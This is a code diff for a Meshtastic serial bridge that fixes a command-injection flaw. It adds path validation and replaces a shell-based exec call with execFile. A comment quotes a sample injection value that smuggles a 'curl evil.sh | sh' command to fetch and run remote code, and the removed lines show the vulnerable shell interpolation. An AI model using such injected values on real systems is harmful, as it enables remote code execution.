@@ -292,8 +292,16 @@ export function registerMeshtasticBridge(): void {
 
     const serialPath = config?.serialPath || ''
 
+    // SECURITY (v1.3.2 — finding B7): validate serialPath before passing
+    // to a subprocess. Without this, a settings-injection (`/dev/null;
+    // curl evil.sh | sh`) becomes RCE-as-the-Heimdall-user. Allowed
+    // patterns: macOS/Linux /dev/* serial devices and Windows COM ports.
+    if (!/^(\/dev\/[a-zA-Z0-9._/-]+|COM\d+)$/.test(serialPath)) {
+      return { success: false, message: `Invalid serial path: ${serialPath.slice(0, 60)}` }
+    }
+
     try {
-      const { exec } = await import('child_process')
+      const { execFile } = await import('child_process')
       const db = getDatabase()
       const now = timestamp()
       const envPath = `${process.env.HOME}/Library/Python/3.9/bin:${process.env.PATH}`
@@ -301,10 +309,14 @@ export function registerMeshtasticBridge(): void {
       log.info(`Meshtastic: pulling node DB via CLI from ${serialPath}`)
 
       return new Promise((resolve) => {
-        // Use meshtastic CLI --nodes to get all nodes in JSON-like format
-        // Timeout after 120 seconds (device needs time to dump 139 nodes)
-        const proc = exec(
-          `meshtastic --port ${serialPath} --nodes`,
+        // Use meshtastic CLI --nodes to get all nodes in JSON-like format.
+        // Switched from `exec` (shell) to `execFile` (no shell) so the
+        // serialPath value is passed as an argv element, not splatted
+        // through /bin/sh. Timeout after 120s (device needs time to dump
+        // 139 nodes).
+        const proc = execFile(
+          'meshtastic',
+          ['--port', serialPath, '--nodes'],
           { env: { ...process.env, PATH: envPath }, timeout: 120000 },
           (err, stdout, stderr) => {
             if (err && !stdout) {
